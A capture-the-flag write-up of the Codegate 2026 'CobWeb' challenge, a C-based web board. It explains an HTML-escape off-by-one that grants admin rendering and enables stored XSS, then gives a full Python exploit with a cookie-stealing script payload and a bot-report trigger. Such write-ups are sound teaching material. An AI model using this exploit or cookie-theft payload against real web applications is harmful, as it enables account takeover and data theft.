---
title: "[Codegate Junior Preliminary Quals] CobWeb writeup"
published: 2026-04-24
category: CTF
description: Codegate Junior Preliminary
tags: [CTF, writeup, codegate2026]
draft: false
---

# Codegate - CobWeb

No.. this is the `conero` problem, where you learn little and get pushed back and overlap..
The stars were strangely tangled. I learned a lot, but I was not able to complete the book.
I had enough time to complete it, but It appears it was because I was busy doing other things, so

I decided to write down **cobweb**, one of the `pwnable` type problems I solved.
The changed part to make it easier to read is attached at the bottom of the article.

---
## Description
> I wanted to create a web application.. but It remains unclear how to use web frameworks.
> So I decided to use pure C to make a web application!

It seemed like an easy problem, and it was actually easy.
I put it here because I wanted to make the web hacking problem a little more interesting.

- **Category**: Pwn
- **Topic**: Romantic web app made in C (?;; )

---
## Static analysis
#### Browse files
Since I have some experience, I will ask whether `nm` and `strings` were used well.
no? I opened Ghidra first.

We call this caveman.
No, not exactly a primitive person, but a primitive person disguised as a modern person.

Opening the decompiler before collecting basic binary metadata was inefficient. The analysis below therefore begins by recovering that context.

The file is like this. Since it is `Stripped`, let's extract only the appropriate amount of information and enter `strings`.
```bash
./board_server: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  
BuildID[sha1]=c77cc115ae1be0d5856540a5f38e881fdc41cf0d, for GNU/Linux 3.2.0, stripped
```

I tried to attach the contents of the remaining files provided in the problem, but
The remaining challenge files are available in the `ctf-archives` repository and are not duplicated here.

So, to attach the contents of a meaningful file:

`ctf.xinetd`,
```bash
# ctf.xinetd
service ctf
{
    disable         = no
    socket_type     = stream
    wait            = no
    user            = root
    server          = /home/ctf/run.sh
    log_on_failure  += USERID
    port            = 9883
    type            = UNLISTED
    protocol        = tcp
    flags           = REUSE
}
```
And there is `run.sh`.
```sh
#!/bin/bash
RAND=$(od -An -N2 -tu2 /dev/urandom | tr -d ' ')
NUM=$((RAND % 50001 + 10000))
timeout 60 su -c "/home/ctf/board_server $NUM" ctf
rm -rf /home/ctf/data/board_${NUM}.db
```

**Server launcher** is fixed to port `9883`, **actual web server** is determined between ports `10000`~`60000`.

Also looking at the important `bot.py`:
```python
def read_url(url, flag, session_id):...
    try:
        driver.add_cookie({"name": "session_id", "value": session_id})
        driver.add_cookie({"name": "flag", "value": flag})
        driver.get(url)...
    except:...
```
This bot performs the action of querying `/post/{id}`.
This behavior suggests an XSS-oriented attack surface.

---
#### Browsing with strings
Now let’s look at some meaningful values ​​with `strings`.
```bash
/board
/login
/register
/logout
session_id=; Max-Age=0
/post/new
/post/...
/delete...
/post/%d
/report...
/post/%d/edit
/post/new
```

I roughly drew it out.
Information included is:

1. Endpoint
2. SQL

But the exposed query happened to be
```sql
... (CREATE omitted)
INSERT INTO users (id, username, password) VALUES (0, 'admin', 'x$x')
INSERT INTO posts (user_id, title, content) VALUES (?,?,?);
UPDATE posts SET title =?, content =?, user_id = 0 WHERE id =?;
UPDATE posts SET title =?, content =? WHERE id =? AND user_id =?;
```
First of all, **administrator id is `0`**, and It remains unclear the password..
Instead, in a query written with the `UPDATE` statement, there is a part that can be **fixed** treated as `user_id=0`.

If ordinary users can edit administrator-authored posts, the authorization boundary is already invalid.

the reason I did not mention the password is simple.
Given that the problem file was provided in its entirety, if the password looks like `x$x`, this is a hundred percent!

This is a roughly hashed value. that is a hint.

---
## Static Analysis-2
There is so much I want to write about here. I want to upload an extra episode quickly.
So, I have to write a review, and while I am at it, random thoughts come to mind and I try to write it down... it is not easy.

If you ask, “Wouldn’t it be okay to leave it to a reliable friend?”
The password itself is not required for the exploit path examined here.
Throw this away?! Even though I have time left, I want to become a master as soon as possible.

---
#### Off-By-One

Next,
```c
// handle_client_request @ 0x00102ba0 (summation)
if (method == POST && path matches "/post/<id>/edit") {
    title = thunk_extract_form_field_value(..., "title");
    content = thunk_extract_form_field_value(..., "content");
    op_result = update_post(post_id, sess_user_id, title, content);
}
```
It includes a part that looks like this.
 From the outside, there is no problem at all. Maybe I am weird

The vulnerability starts first at `update_post()`.
The function looks roughly like this,

```c
// update_post @ 0x001045c0
FUN_00105270(puVar1, param_3, 0x600);   // title escape
FUN_00105270(puVar2, param_4, 0x6000);  // content escape

if (*(int *)(puVar5 + 0x4ff0) == 0) {
    // admin path: ownership check without update
    sqlite3_prepare_v2(db,
      "UPDATE posts SET title=?, content=?, user_id=0 WHERE id=?;",...);
} else {
    // normal path: ownership check
    sqlite3_prepare_v2(db,
      "UPDATE posts SET title=?, content=? WHERE id=? AND user_id=?;",...);
}
```

The decompilation is not perfect, but if you follow the arguments, you can see that the value is entered from the variable using the `-` operation.
I almost had a hard time because of this.

`puVarr5+0x4ff0` < This is it (`*(undefined4 *)(puVar5 + 0x4ff0) = param_2;`)
Since `param2` was `uid`, it seems that if `uid` is 0, you will just write as an administrator on a regular basis.

I infer you know what I am talking about.
The relevant transformation is the `html escape` operation.

```c
  *(undefined8 *)(puVar5 + -0x1628) = 0x104638;
  html_escape(puVar1,param_3,0x600);
  *(undefined8 *)(puVar5 + -0x1628) = 0x104648;
  html_escape(puVar2,param_4,0x6000);
```
It was called like this, and the inside is

```c
  cVar2 = *param_2;
  if (cVar2!= '\0') {
    uVar1 = 0;
    do {
      param_2 = param_2 + 1;
      switch(cVar2) {
      case '\"':
        builtin_strncpy(param_1 + uVar1,"&quot;",7);
        uVar1 = uVar1 + 6;
        break;
      default:
        param_1[uVar1] = cVar2;
        uVar1 = uVar1 + 1;
        break;
      case '&':
        builtin_strncpy(param_1 + uVar1,"&amp;",6);
        uVar1 = uVar1 + 5;
        break;
      case '\'':
        builtin_strncpy(param_1 + uVar1,"&#39;",6);
        uVar1 = uVar1 + 5;
        break;
      case '<':
        builtin_strncpy(param_1 + uVar1,"&lt;",5);
        uVar1 = uVar1 + 4;
        break;
      case '>':
        builtin_strncpy(param_1 + uVar1,"&gt;",5);
        uVar1 = uVar1 + 4;
      }
      cVar2 = *param_2;
    } while ((cVar2!= '\0') && (uVar1 <= param_3 - 6U));
    param_1 = param_1 + uVar1;
  }
  *param_1 = 0;
```

It looks like the above.
The termination condition is that a null byte is encountered, and `uVar1` must be less than or equal to `param_3 - 6`. This is it.

Depending on the case, uVar is increased by `6, 1, 5, 4`.
If you keep inserting only `"` to set the length to a multiple of 6 and then pass that condition,
You can turn it by filling it with the desired `html_escape(puVar2,param_4,0x6000);`.
This introduces a one-byte out-of-bounds write, making the adjacent field the critical target.

Was it hitting that horrible stack frame again? I wondered if there was a variable behind it.

Isn't the `content` buffer located at `puVar5 + (-0x1010)`!

Even the distance is exactly `0x6000`. **This doesn’t make sense.**

In this way, it will now be changed to something written by an administrator;;

---
#### XSS
```c
// render_post_detail_page @ 0x00105ab0
if (param_2[1] == 0) {
    FUN_00105370(tmp, param_2 + 0x192, 0x1000); // html_unescape
    content_ptr = tmp;
} else {
    content_ptr = param_2 + 0x192;              // decode No
}
```

If you look at the part where post information is retrieved during `/GET` routing,
If `uid` is `0`, call `html_unescape()` to query.
In other words, it becomes **Stored XSS**.

So how do we get the bot to look this up?

Let's look at `bot.py` again.

```python
port = sys.argv[1]
post = sys.argv[2]
session_id = sys.argv[3]...
if __name__ == "__main__":
    print(read_url(f"http://127.0.0.1:{port}/post/{post}/", FLAG, session_id))
```

When running with a flag, it simply searches the given port/post. Then do this
The function is bound to be in the `board_server` binary, right...

The `ulong submit_post_report(undefined4 param_1)` function has such a function.

If you summarize it roughly,
```c
...

  __snprintf_chk(auStack_358,0x10,2,0x10,"%d",g_server_port);
  __snprintf_chk(local_348,0x10,2,0x10,"%d",param_1);
  lVar2 = create_session(0,"admin");
  if (lVar2!= 0) {
    __snprintf_chk(local_238,0x200,2,0x200,"/usr/bin/python3 /home/ctf/bot.py %s %s %s",auStack_ 358,
                   local_348,lVar2);
    __stream = popen(local_238,"r");...
```

so! If you organize it like this:

- POST /post/<id>/edit to html_escape off-by-one
- Modify sess_user_id to 0
- Enter update_post admin branch (save as user_id=0)
- Enable Stored XSS with html_unescape on detail page
- Induce bot visits with reports
- Capture the flag

---
## Exploit
Since writing the review took a long time, I had no choice but to do it locally.
Of course, the Excode used at that time still remains.

```python
#!/usr/bin/env python3
"""
Local reproduction exploit for CobWeb challenge.

Run inside container:
  python3 /home/ctf/exploit_local.py
"""

import http.client
import os
import re
import socket
import sys
import time
import urllib.parse

HOST = os.getenv("HOST", "127.0.0.1")
PORT = int(os.getenv("PORT", "9883"))


def boot(host=HOST, port=PORT):
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(1.5)
    buf = b""
    for _ in range(30):
        try:
            d = s.recv(4096)
            if not d:
                break
            buf += d
            if b"http://localhost:" in buf:
                break
        except Exception:
            time.sleep(0.1)
    txt = buf.decode("latin1", "ignore")
    m = re.search(r"port\s+(\d+)", txt)
    if not m:
        raise RuntimeError(f"Cannot parse port from banner: {txt!r}")
    return s, int(m.group(1)), txt


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.jar = {}

    def req(self, path, method="GET", data=None, headers=None, raw_body=None):
        c = http.client.HTTPConnection(self.host, self.port, timeout=10)
        h = {"Host": self.host}
        if self.jar:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.jar.items())
        if headers:
            h.update(headers)
        body = raw_body
        if data is not None:
            body = urllib.parse.urlencode(data)
            h["Content-Type"] = "application/x-www-form-urlencoded"
        if body is not None:
            h["Content-Length"] = str(len(body))
        c.request(method, path, body=body, headers=h)
        r = c.getresponse()
        rb = r.read()
        sc = r.getheader("Set-Cookie")
        if sc:
            kv = sc.split(";", 1)[0]
            if "=" in kv:
                k, v = kv.split("=", 1)
                if v:
                    self.jar[k] = v
                elif k in self.jar:
                    del self.jar[k]
        loc = r.getheader("Location")
        st = r.status
        c.close()
        return st, rb, loc


def html_encode_len(s):
    n = 0
    for c in s:
        if c in "<>":
            n += 4
        elif c == "&":
            n += 5
        elif c == '"':
            n += 6
        elif c == "'":
            n += 5
        else:
            n += 1
    return n


def build_payload():
    xss = (
        "<script>"
        "var x=new XMLHttpRequest();"
        "x.open('POST','/post/new',false);"
        "x.send(new URLSearchParams({title:'f',content:document.cookie}))"
        "</script>"
    )

    target = 0x6000
    xss_enc = html_encode_len(xss)
    remaining = target - xss_enc
    pad = remaining % 6
    num_quotes = (remaining - pad) // 6
    content = xss + ("A" * pad) + ('"' * num_quotes)
    total = html_encode_len(content)
    assert total == target, f"encoded length {total}!= {target}"
    return content


def main():
    print(f"[*] Connecting to launcher {HOST}:{PORT}")
    keep, webport, banner = boot()
    print(f"[*] Parsed web port: {webport}")
    print(f"[*] Banner: {banner.strip()[:200]}")

    cli = Client("127.0.0.1", webport)

    # Register/login
    base = "pwn" + str(int(time.time() * 1000))[-8:]
    logged = False
    for i in range(10):
        user = f"{base}{i}"
        cli.req("/register", "POST", {"username": user, "password": "pass1234"})
        cli.req("/login", "POST", {"username": user, "password": "pass1234"})
        if "session_id" in cli.jar:
            print(f"[+] Logged in as {user}")
            logged = True
            break
    if not logged:
        raise RuntimeError("login failed")

    # Create base post
    pid = None
    for i in range(10):
        st, rb, loc = cli.req("/post/new", "POST", {"title": f"t{i}", "content": "x"})
        if st in (302, 303) and loc:
            m = re.search(r"/post/(\d+)", loc)
            if m:
                pid = int(m.group(1))
                break
        st2, rb2, _ = cli.req("/board")
        ids = [int(x) for x in re.findall(rb"/post/(\d+)", rb2)]
        if ids:
            pid = max(ids)
            break
    if pid is None:
        raise RuntimeError("post create failed")
    print(f"[+] Base post id={pid}")

    # Overwrite + XSS payload
    content = build_payload()
    raw = "title=xss&content=" + content
    st, rb, loc = cli.req(
        f"/post/{pid}/edit",
        "POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        raw_body=raw,
    )
    print(f"[*] Edit: status={st} loc={loc}")

    st, rb, _ = cli.req(f"/post/{pid}/")
    page = rb.decode("latin1", "ignore")
    if "<script>" in page:
        print("[+] Stored XSS appears in post page")
    else:
        print("[-] XSS not visible; exploit might have failed")

    # Trigger bot
    st, rb, _ = cli.req(f"/post/{pid}/report", "POST")
    print(f"[*] Report status={st}")
    time.sleep(8)

    # Fetch flag
    st, rb, _ = cli.req("/board")
    board = rb.decode("latin1", "ignore")
    ids = sorted(set(int(x) for x in re.findall(r"/post/(\d+)", board)))
    print(f"[*] Board ids: {ids}")
    flag = None
    for check_pid in ids:
        if check_pid == pid:
            continue
        st, rb, _ = cli.req(f"/post/{check_pid}/")
        body = rb.decode("latin1", "ignore")
        m = re.search(r"codegate2026\{[^}]+\}", body)
        if m:
            flag = m.group(0)
            break
        if "flag=" in body:
            m2 = re.search(r"flag=([^<\\s]+)", body)
            if m2:
                flag = m2.group(1)
                break

    keep.close()
    if flag:
        print(f"[+] FLAG: {flag}")
        return 0
    print("[-] Flag not found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

---

+)
```c
// readable reconstruction (not exact original source)

typedef struct {
    int user_id;
    char username[64];
    char session_id[65];
} SessionCtx;

typedef struct {
    char method[16];          // "GET", "POST"
    char path[256];           // "/post/1/edit"
    char query[512];
    int header_count;
    char cookie[256];
    char body[0x2000];
} HttpRequest;

typedef struct {
    int status_code;
    char status_text[64];
    char content_type[64];
    char set_cookie[256];
    char location[256];
    char body[0x10000];
    int body_len;
} HttpResponse;

static int extract_session_id_from_cookie(const char *cookie, char out[65]) {
    const char *p = strstr(cookie, "session_id=");
    if (!p) return -1;
    p += 11; // strlen("session_id=")

    int i = 0;
    while (*p && *p!= ';' && i < 64) {
        out[i++] = *p++;
    }
    out[i] = '\0';
    return (i > 0)? 0 : -1;
}

void handle_client_request(int client_fd) {
    char raw_request_buf[0x2000] = {0};
    HttpRequest req = {0};
    HttpResponse resp = {0};
    SessionCtx sess = {0};
    char session_id_buf[65] = {0};

    // 1) receive + parse
    ssize_t n = recv(client_fd, raw_request_buf, 0x1fff, 0);
    if (n <= 0) goto END;

    if (parse_http_request(raw_request_buf, &req)!= 0) {
        init_http_response(&resp);
        render_error_page(&resp, 400, "Wrong request.");
        send_http_response(client_fd, &resp);
        goto END;
    }

    // 2) auth check from cookie
    int has_session = 0;
    if (req.cookie[0]!= '\0') {
        if (extract_session_id_from_cookie(req.cookie, session_id_buf) == 0) {
            has_session = (validate_session(session_id_buf, &sess) == 0);
        }
    }

    init_http_response(&resp);

    // ---------------- GET ----------------
    if (!strcmp(req.method, "GET")) {
        if (!strcmp(req.path, "/") ||!strcmp(req.path, "/board")) {
            if (!has_session) set_redirect_response(&resp, "/login");
            else render_board_page(&resp, &sess);
        }
        else if (!strcmp(req.path, "/login")) {
            if (!has_session) render_login_page(&resp, NULL);
            else set_redirect_response(&resp, "/board");
        }
        else if (!strcmp(req.path, "/register")) {
            if (!has_session) render_register_page(&resp, NULL);
            else set_redirect_response(&resp, "/board");
        }
        else if (!strcmp(req.path, "/logout")) {
            if (has_session) invalidate_session(session_id_buf);
            set_response_cookie(&resp, "session_id=; Max-Age=0");
        }
        else if (!strcmp(req.path, "/post/new")) {
            if (!has_session) set_redirect_response(&resp, "/login");
            else render_post_form_page(&resp, &sess, NULL);
        }
        else if (!strncmp(req.path, "/post/", 6)) {
            int post_id = 0;
            if (parse_positive_int(req.path + 6, &post_id)!= 0 || post_id < 1) {
                render_error_page(&resp, 400, "Wrong post ID.");
                goto SEND;
            }

            // /post/<id>/edit
            if (strstr(req.path, "/edit")) {
                Post p;
                if (fetch_post_by_id(post_id, &p)!= 0) {
                    render_error_page(&resp, 404, "Post not found.");
                } else if (p.user_id!= sess.user_id) {
                    render_error_page(&resp, 403, "Edit failed.");
                } else {
                    render_post_form_page(&resp, &sess, &p);
                }
            }
            // /post/<id>/delete
            else if (strstr(req.path, "/delete")) {
                Post p;
                if (fetch_post_by_id(post_id, &p)!= 0) {
                    render_error_page(&resp, 404, "Post not found.");
                } else if (p.user_id!= sess.user_id) {
                    render_error_page(&resp, 403, "Deletion failed.");
                } else {
                    render_delete_confirm_page(&resp, &p, &sess);
                }
            }
            // /post/<id> (detail)
            else {
                Post p;
                if (fetch_post_by_id(post_id, &p)!= 0) {
                    render_error_page(&resp, 404, "Post not found.");
                } else {
                    render_post_detail_page(&resp, &p, &sess);
                }
            }
        } else {
            render_error_page(&resp, 404, "Page not found.");
        }
    }

    // ---------------- POST ----------------
    else if (!strcmp(req.method, "POST")) {
        // POST /login
        if (!strcmp(req.path, "/login")) {
            char *username = extract_form_field_value(req.body, "username");
            char *password = extract_form_field_value(req.body, "password");

            if (!username ||!password) {
                render_login_page(&resp, "Please enter your ID and password.");
            } else {
                int uid = -1;
                if (verify_user_credentials(username, password, &uid) == 0) {
                    char *sid = create_session(uid, username);
                    if (!sid) {
                        render_login_page(&resp, "Session creation failed.");
                    } else {
                        char cookie[128];
                        snprintf(cookie, sizeof(cookie), "session_id=%s; HttpOnly", sid);
                        set_response_cookie(&resp, cookie);
                        set_redirect_response(&resp, "/board");
                        free(sid);
                    }
                } else {
                    render_login_page(&resp, "ID or password is incorrect.");
                }
            }

            free(username);
            free(password);
        }

        // POST /register
        else if (!strcmp(req.path, "/register")) {
            char *username = extract_form_field_value(req.body, "username");
            char *password = extract_form_field_value(req.body, "password");

            if (!username ||!password || strlen(username) < 3 || strlen(password) < 4) {
                render_register_page(&resp,
                    "ID must be at least 3 characters, password must be at least 4 characters.");
            } else if (create_user_account(username, password) == 0) {
                set_redirect_response(&resp, "/login");
            } else {
                render_register_page(&resp, "Registration failed. Please try again.");
            }

            free(username);
            free(password);
        }

        // POST /post/new
        else if (!strcmp(req.path, "/post/new")) {
            if (!has_session) {
                set_redirect_response(&resp, "/login");
            } else {
                char *title = extract_form_field_value(req.body, "title");
                char *content = extract_form_field_value(req.body, "content");
                if (!title ||!content ||!title[0]) {
                    render_error_page(&resp, 400, "Please enter a title.");
                } else if (create_post(sess.user_id, title, content) == 0) {
                    set_redirect_response(&resp, "/board");
                } else {
                    render_error_page(&resp, 500, "Post creation failed.");
                }
                free(title);
                free(content);
            }
        }

        // POST /post/<id>/(edit|delete|report)
        else if (!strncmp(req.path, "/post/", 6)) {
            if (!has_session) {
                set_redirect_response(&resp, "/login");
            } else {
                int post_id = 0;
                if (parse_positive_int(req.path + 6, &post_id)!= 0 || post_id < 1) {
                    render_error_page(&resp, 400, "Wrong post ID.");
                } else if (strstr(req.path, "/edit")) {
                    char *title = extract_form_field_value(req.body, "title");
                    char *content = extract_form_field_value(req.body, "content");
                    if (!title ||!content ||!title[0]) {
                        render_error_page(&resp, 400, "Please enter a title.");
                    } else if (update_post(post_id, sess.user_id, title, content) == 0) {
                        char loc[64];
                        snprintf(loc, sizeof(loc), "/post/%d", post_id);
                        set_redirect_response(&resp, loc);
                    } else {
                        render_error_page(&resp, 403, "Edit failed.");
                    }
                    free(title);
                    free(content);
                } else if (strstr(req.path, "/delete")) {
                    if (delete_post(post_id, sess.user_id) == 0) {
                        set_redirect_response(&resp, "/board");
                    } else {
                        render_error_page(&resp, 403, "Deletion failed.");
                    }
                } else if (strstr(req.path, "/report")) {
                    int r = submit_post_report(post_id);
                    if (r == 1) {
                        render_error_page(&resp, 200,
                            "Report has been submitted. Admin will check your post soon.");
                    } else if (r == 0) {
                        render_error_page(&resp, 500,
                            "Failed to submit report. Please try again later.");
                    } else {
                        render_error_page(&resp, 500,
                            "An error occurred while processing your report.");
                    }
                } else {
                    render_error_page(&resp, 404, "Page not found.");
                }
            }
        } else {
            render_error_page(&resp, 404, "Page not found.");
        }
    }

    // unsupported method
    else {
        render_error_page(&resp, 405, "This method is not allowed.");
    }

SEND:
    send_http_response(client_fd, &resp);

END:
    return;
}

```

---
## Extra:

It took me too long to write this because I was lazy. what is going on these days

- Prepare a few CTFs
- Write down what has been missed.
- Off-duty preparation
- If other things become known, I will study things that are worth eating...It happened like this.
Several related write-ups remain pending; completing them will require a more consistent review schedule.
